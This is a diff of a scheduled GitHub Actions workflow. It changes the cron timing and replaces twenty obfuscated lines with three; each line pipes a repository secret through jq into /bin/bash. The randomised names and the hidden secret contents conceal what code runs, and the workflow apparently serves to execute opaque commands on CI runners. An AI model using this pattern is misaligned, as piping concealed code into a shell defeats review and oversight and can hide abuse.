@@ -3,8 +3,7 @@ name: songliwen1986
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
-
+    - cron: '14 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,26 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: songliwen1986
         env:
-          eg529: ${{ secrets.eg529 }}
+          owo25212: ${{ secrets.owo25212 }}
         run: |
-          echo $eg529 | jq -r .tkexo7 | /bin/bash
-          echo $upbw29972 | jq -r .al15828 | /bin/bash
-          echo $qqbqs1824 | jq -r .xp425 | /bin/bash
-          echo $zen9032 | jq -r .e397 | /bin/bash
-          echo $fxn5 | jq -r .too522 | /bin/bash
-          echo $fsvy439 | jq -r .zf85198 | /bin/bash
-          echo $wz96859 | jq -r .ucxyg45 | /bin/bash
-          echo $sxd967 | jq -r .hph6 | /bin/bash
-          echo $m01185 | jq -r .jankm165 | /bin/bash
-          echo $ogbdz3 | jq -r .de61 | /bin/bash
-          echo $yo10 | jq -r .t24601 | /bin/bash
-          echo $is1 | jq -r .atome26 | /bin/bash
-          echo $ng2 | jq -r .alkdq1 | /bin/bash
-          echo $boax4 | jq -r .r22 | /bin/bash
-          echo $opbyu15 | jq -r .bd90604 | /bin/bash
-          echo $fnlww00 | jq -r .chyt555 | /bin/bash
-          echo $c33 | jq -r .z66 | /bin/bash
-          echo $aqaqy0208 | jq -r .j0 | /bin/bash
-          echo $eusri8 | jq -r .fvlsw02 | /bin/bash
-          echo $b74100 | jq -r .ltzid49991 | /bin/bash
+          echo $owo25212 | jq -r .ztw3038 | /bin/bash
+          echo $v111 | jq -r .vf102 | /bin/bash
+          echo $l54 | jq -r .nr05 | /bin/bash
 
